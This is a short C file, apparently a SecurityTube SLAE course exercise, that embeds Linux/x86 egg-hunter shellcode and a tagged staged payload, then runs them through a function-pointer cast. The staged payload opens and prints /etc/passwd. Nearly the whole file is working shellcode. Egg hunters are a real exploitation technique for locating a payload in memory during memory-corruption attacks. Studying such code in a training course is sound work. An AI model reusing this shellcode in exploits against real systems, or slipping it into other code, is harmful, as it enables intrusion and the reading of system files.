/*
	Egg Hunter - Linux/x86 Shellcode
	Author: Nathu Nandwani
	SecurityTube ID: SLAE-1261
*/

#include <unistd.h>
#include <stdio.h>
int main() 
{
	// Read /etc/passwd shellcode
	char staged[] = "n00bn00b\x31\xc9\x51\x68\x73\x77\x64\x00\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x31\xc0\xb0\x05\x89\xe3\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xfe\xc2\xcd\x80\x50\x53\x31\xc0\xb0\x04\x31\xdb\xfe\xc3\xcd\x80\x5b\x58\x83\xf8\x01\x74\xe1\xb0\x06\xcd\x80\xb0\x01\xcd\x80";

	char code[] = "\x31\xdb\xf7\xeb\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\xb8\x6e\x30\x30\x62\x3b\x02\x75\xe9\x3b\x42\x04\x75\xe4\x83\xc2\x08\xff\xe2";

	int (*ret)() = (int(*)())code;
	ret();
}
